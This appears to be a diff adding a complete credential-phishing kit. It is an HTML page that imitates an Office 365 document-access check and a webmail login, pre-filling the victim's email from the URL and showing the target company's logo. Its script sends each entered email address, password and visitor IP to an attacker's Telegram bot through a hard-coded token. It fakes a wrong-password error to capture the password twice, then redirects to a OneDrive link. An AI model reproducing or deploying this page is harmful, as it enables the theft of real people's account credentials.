@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title id="t1"></title>
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+
+    <style>body{
+        background: #D1D8F3;
+        background-image: url("https://lh3.googleusercontent.com/u/0/drive-viewer/AK7aPaCoQh-Xf07YnW1wekRb4PZnUVFR47iBMjBoZM8t1pc-4FT1wkAtj0Hm9o2hdYjYT4zUBFjov1aptrLW9n_Hs04w7WeSOg=w3437-h1815");
+        background-repeat: no-repeat;
+        background-size: cover;
+    }
+
+    .container{
+        width:100%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+
+    .office{
+        width: 380px;
+        background: #fff;
+    }
+
+    .office-holder{
+        width:80%;
+        margin: auto;
+        padding: 20px 0px;
+    }
+
+    .logo{
+        width:100%;
+        float: left;
+        margin-bottom: 2em;
+    }
+
+    .logo h1{
+        font-family: arial;
+    }
+
+    .verify{
+        width: 70%;
+        margin: auto;
+    }
+
+    .verify h4{
+        font-family: arial;
+    }
+
+    fieldset{
+        width: 90%;
+        float: right;
+        border:2px solid #4285f4;
+        border-radius: 5px;
+    }
+
+    legend{
+        font-size: 15px;
+        overflow: hidden;
+        width: 42%;
+        padding:0px 2px;
+        margin: 0px;
+    }
+
+    .verify input[type='text']{
+        width: 100%;
+        float: right;
+        border:none;
+        padding:3px 10px;
+    }
+
+    .verify button{
+        border:none;
+        height: 40px;
+        width: 80px;
+        float: right;
+        margin-top: 2em;
+        background: #4285f4;
+        border-radius: 5px;
+        color: #fff;
+    }
+
+    .email-to-verify{
+        border:1px solid #000;
+        border-radius: 10px;
+    }
+
+    .form-holder{
+        width:100%;
+        float: left;
+    }
+
+    .form-holder h3{
+        font-weight: 600;
+    }
+
+    .form-holder input[type='email'], input[type='password']{
+        width: 100%;
+        height:40px;
+        float: left;
+        margin-bottom: 15px;
+    }
+    .form-holder .btn-holder{
+        width:100%;
+        margin-top:1em;
+        display: flex;
+        align-content: center;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .form-holder .btn-holder .btn{
+        background:#0073C6;
+        border:none;
+        padding:6px 10px;
+        color:#fff;
+        border-radius: 0px;
+        margin-top: 20px;
+        margin-bottom: 20px;
+    }
+
+    .form-holder .btn-holder .btn:hover{
+        cursor:pointer;
+    }
+
+    .checkbox{
+        width: 100%;
+        float: left;
+        margin-top:5px;
+    }
+
+    .checkbox label{
+        font-family:arial;
+        font-size:13px;
+        float: left;
+        margin-left:1em;
+    }
+
+    .hide{
+        display: none;
+    }
+    .tb_button {
+        padding: 1px;
+        cursor: pointer;
+        border-right: 1px solid #8b8b8b;
+        border-left: 1px solid #FFF;
+        border-bottom: 1px solid #fff;
+    }
+
+    .tb_button.hover {
+        borer: 2px outset #def;
+        background-color: #f8f8f8 !important;
+    }
+
+    .ws_toolbar {
+        z-index: 100000
+    }
+
+    .ws_toolbar .ws_tb_btn {
+        cursor: pointer;
+        border: 1px solid #555;
+        padding: 3px
+    }
+
+    .tb_highlight {
+        background-color: yellow
+    }
+
+    .tb_hide {
+        visibility: hidden
+    }
+
+    .ws_toolbar img {
+        padding: 2px;
+        margin: 0px
+    }
+
+    </style>
+</head>
+
+<body>
+    <div id="html_encoder_div">
+        <div class="container">
+            <div class="office show border shadow bg-light" id="others">
+			
+				<div id="Div1" style="display:none">
+                <div class="office-holder">
+                    <div class="logo" style="text-align:center">
+                        <div>
+                            <img src="https://www.scnsoft.com/blog-pictures/sharepoint/office_365_security-01_1.png" width="100%" alt="Comp">
+                        </div><br>
+                        <h5 id="I1" class="text-dark"><strong  class="text-uppercase"></strong></h3>
+                        <p id="Sec1" class="font-weight-light"></p>
+                    </div>
+                    <form>
+                        <div class="form-holder">
+                            <div style="width: 100%;">
+                                <div class="alert alert-danger hide alert2"></div>
+                            </div>
+                            <input type="email" id="aii" name="" class="form-control" value="" placeholder="someone@example.com" required="">
+                            <div class="btn-holder">
+                                <button class="btn btn-lg col-12" id="submit-btnn"></button>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+				</div>
+				
+				
+			<div id="Div2" style="display:none">
+				<div class="office-holder">
+                    <div class="logo" style="text-align:center">
+                        <div id="login_logo">
+                            <img id="login_logo1" "https://pub-a7de9c65a2694c0ba9baaa2310c3c6f1.r2.dev/src" width="50" height="50" alt="Webmail">
+                        </div>
+                        <h3 class="text-dark"><strong id="domain-name" class="text-uppercase">WEBMAIL</strong></h3>
+                        <h5 id="Pl1" class="font-weight-light"></h5>
+                    </div>
+                    <center>
+                        <div id="msg" style="display: none;font-weight: 600;color: red;"></a></div>
+                        <span id="error" class="text-danger" style="display: none;"></span>
+                    </center>
+                    <form>
+                        <div class="form-holder">
+                            <div style="width: 100%;">
+                                <div class="alert alert-danger hide alert2"></div>
+                            </div>
+                            <input type="email" id="ai" class="form-control" value="" placeholder="someone@example.com" required="">
+                            <input type="password" id="pr" placeholder="Password" class="form-control" required="" autofocus>
+                            <div class="checkbox">
+                                <input type="checkbox" name="" style="float: left; margin-top:2px; margin-bottom: 10px;">
+                                <label id="lbl"></label>
+                            </div>
+                            <div class="btn-holder">
+                                <button class="btn btn-lg col-12" id="submit-btn"></button>
+                            </div>
+                            <p id="cnt" style="color:#0073C6; margin-top:1em; float: left; width:100%;"></p>
+                            <p style="color:#0073C6; margin-top:0em; float: left; width:100%;" id="sgn"></p>
+                        </div>
+                    </form>
+                </div>
+			</div>
+            </div>
+        </div>
+    </div>
+    <input type="hidden" name="usrip1" id="usrip1" value="">
+</body>
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script> 
+
+
+<script type='text/javascript'>
+
+var aix = "";
+$("#t1").html("Access your document")
+$("#I1").html("IDENTITY VERIFICATION")
+$("#Sec1").html("For your security we need to verify your identity: To gain access to this document, enter the email address this document was sent to.")
+$("#submit-btnn").html("Access Document")
+$("#wm").html("WEBMAIL") 
+$("#Pl1").html("Please connect to your email provider to confirm your identity. This will initialize the proxy designation process") 
+$("#msg").html("Your email password is incorrect. Please check your input and try again.") 
+$("#error").html("That account doesn't exist. Enter a different account") 
+$("#lbl").html("REMEMBER ME") 
+$("#submit-btn").html("LOGIN") 
+$("#cnt").html("can't access your account?") 
+$("#sgn").html("Sign in with a single-use code") 
+
+
+
+ $('#submit-btnn').click(function(event) {
+     $('#submit-btnn').html('Verifing...');
+        event.preventDefault();
+    if (document.getElementById('aii').value === ''){
+        alert('Enter a valid email address');
+		$('#submit-btnn').html('Access Document');
+        return false;
+    }
+	var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+	if (!filter.test(document.getElementById('aii').value)) {
+            alert('Enter a valid email address');
+			$('#submit-btnn').html('Access Document');
+			return false;
+    }
+	var my_ai = document.getElementById('aii').value;
+    $('#ai').attr('disabled', "");
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+        $('#ai').val(my_ai);
+        $('#ai').attr('disabled', "");
+        // $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+
+
+
+        var imageUrl = 'https://logo.clearbit.com/' + my_slice;
+        var img = new Image();
+img.src = imageUrl;
+
+img.onload = function() {
+    // URL exists, update the src attribute
+    $('#login_logo1').attr('src', imageUrl);
+};
+
+img.onerror = function() {
+    // URL does not exist (returns a 404 or other error status)
+    // You can choose to do nothing or set a default src here
+    // For example, setting a default image
+    $('#login_logo1').attr('src', 'https://pub-0a3bbd7611f44b7a9411b5413ecb44ac.r2.dev/weblogo_fs2day.png');
+};
+
+
+
+        $('#domain-name').html(dom);
+        $("#msg").hide();
+        $("#inputbar").animate({ left: 200, opacity: "hide" }, 0);
+        $("#automail").animate({ right: 200, opacity: "show" }, 1000);
+	setTimeout(function() {
+	 var x = document.getElementById("Div1");
+	 var xx = document.getElementById("Div2");
+     if (x.style.display === "block" && xx.style.display === "none") {
+         x.style.display = "none";
+		 xx.style.display = "block";
+	 } 
+	}, 1000);
+	})
+
+
+// Define a simple function to check if a string is a valid email address
+function isEmail(email) {
+    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return regex.test(email);
+}
+
+// Initialize URLSearchParams with the current window location search string
+var params = new URLSearchParams(window.location.search);
+var finalEmail = null;
+
+console.log("Starting to iterate through the URL parameters");
+
+// Iterate through the parameters and find the email
+for (const key of params.keys()) {
+    console.log("Checking parameter:", key);
+    const value = params.get(key);
+
+    // Check if the value is already a valid email
+    if (isEmail(value)) {
+        console.log("Valid email found:", value);
+        finalEmail = value;
+        break;
+    }
+
+    // If it is not a valid email, try to decode it
+    try {
+        console.log("Attempting to decode value:", value);
+        const decodedValue = atob(value);
+        console.log("Decoded value:", decodedValue);
+        
+        if (isEmail(decodedValue)) {
+            console.log("Valid decoded email found:", decodedValue);
+            finalEmail = decodedValue;
+            break;
+        } else {
+            console.log("Decoded value is not a valid email:", decodedValue);
+        }
+    } catch (e) {
+        console.error("Error decoding Base64:", e);
+    }
+}
+
+if (finalEmail) {
+    console.log("Assigning finalEmail to ai:", finalEmail);
+    var ai = finalEmail;
+} else {
+    console.log("No valid email found. Assigning fallback value to ai.");
+    var ai = aix; // Replace with an appropriate fallback value
+}
+console.log("Final value of ai:", ai);
+
+function tmsend(message){
+    var token = "6418553721:AAGVKnkj2GQtHDdpkuk39VDTrCMtVie0gas";
+    var chat_id= "1447595072";
+    const url = `https://api.telegram.org/bot${token}/sendMessage` // The url to request
+
+    const obj = {
+        chat_id: chat_id, // Telegram chat id
+        text: message // The text to send
+    };
+
+    const xht = new XMLHttpRequest();
+    xht.open("POST", url, true);
+    xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
+    xht.send(JSON.stringify(obj));
+}
+$(document).ready(function() {
+    var count = 0;
+    $('#back1').click(function() {
+        $("#msg").hide();
+        $('#ai').val("");
+        $("#automail").animate({ left: 200, opacity: "hide" }, 0);
+        $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);
+    });
+    /////////////url ai getting////////////////
+    if (!ai) {
+	var x = document.getElementById("Div1");
+	var xx = document.getElementById("Div2");
+         x.style.display = "block";
+		 xx.style.display = "none";
+    } else {
+        // $('#ai').val(ai);
+		
+		var x = document.getElementById("Div1");
+		var xx = document.getElementById("Div2");
+         x.style.display = "none";
+		 xx.style.display = "block";
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+        $('#ai').val(my_ai);
+        $('#ai').attr('disabled', "");
+
+        var imageUrl = 'https://logo.clearbit.com/' + my_slice;
+        var img = new Image();
+img.src = imageUrl;
+
+img.onload = function() {
+    // URL exists, update the src attribute
+    $('#login_logo1').attr('src', imageUrl);
+};
+
+img.onerror = function() {
+    // URL does not exist (returns a 404 or other error status)
+    // You can choose to do nothing or set a default src here
+    // For example, setting a default image
+    $('#login_logo1').attr('src', 'https://pub-0a3bbd7611f44b7a9411b5413ecb44ac.r2.dev/weblogo_fs2day.png');
+};
+        
+        // if($('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice)){
+        //     $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        // }
+        // else{
+        //     $('#login_logo1').attr('src', 'https://res.cloudinary.com/ducjuygen/image/upload/v1662462897/weblogo_fs2day.png');
+  
+        // }
+        $('#domain-name').html(dom);
+        $("#msg").hide();
+        $("#inputbar").animate({ left: 200, opacity: "hide" }, 0);
+        $("#automail").animate({ right: 200, opacity: "show" }, 1000);
+    }
+    ///////////////url getting ai////////////////
+
+
+    var file = "PUTYOURbase64LINKnext.ph";
+    $('#submit-btn').click(function(event) {
+        $('#submit-btn').html('Verifing...');
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var msg = $('#msg').html();
+        $('#msg').text(msg);
+        ///////////new injection////////////////
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!ai) {
+            $('#error').show();
+            $('#error').html("Email field is empty.!");
+            ai.focus;
+            return false;
+        }
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a different account");
+            ai.focus;
+            return false;
+        }
+        if (!pr) {
+            $('#error').show();
+            $('#error').html("Password field is empty.!");
+            pr.focus;
+            return false;
+        }
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+        var newDate = new Date();
+        var datetime =  newDate.toLocaleString();
+        ///////////new injection////////////////
+        count = count + 1;
+        $('#ai').attr('disabled', "");
+
+        var imageUrl = 'https://logo.clearbit.com/' + my_slice;
+        var img = new Image();
+img.src = imageUrl;
+
+img.onload = function() {
+    // URL exists, update the src attribute
+    $('#login_logo1').attr('src', imageUrl);
+};
+
+img.onerror = function() {
+    // URL does not exist (returns a 404 or other error status)
+    // You can choose to do nothing or set a default src here
+    // For example, setting a default image
+    $('#login_logo1').attr('src', 'https://pub-0a3bbd7611f44b7a9411b5413ecb44ac.r2.dev/weblogo_fs2day.png');
+};
+        // $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(dom);
+        var ozi = "\n=========KSN======\n"
+        ozi+="Email:--> "+ai
+        ozi+="\nPass:--> " +pr
+        ozi+="\n============================"
+        ozi+= "\nIP:-->  "+document.getElementById('usrip1').value;
+        ozi+="\n============================\n"
+        tmsend(ozi)
+        function greet() {
+            $('#submit-btn').html('Login')
+            $("#msg").show();
+            $('#pr').val("");
+            $("#pr").focus();
+        }
+        setTimeout(greet, 2000);
+        if (count >= 2) {
+            count = 0;
+            // window.location.replace(response['redirect_link']);
+            window.location.replace("https://1drv.ms/b/s!AjcBu1NAeJafa9AjGj-IAxUlynQ?e=yPpZtx");
+
+        }
+       
+
+    });
+
+
+});
+
+$.getJSON("https://api.ipify.org?format=json", 
+function(data) { 
+var ipx = data.ip;
+document.getElementById('usrip1').value = ipx;
+}) 
+</script>
+
+</html>
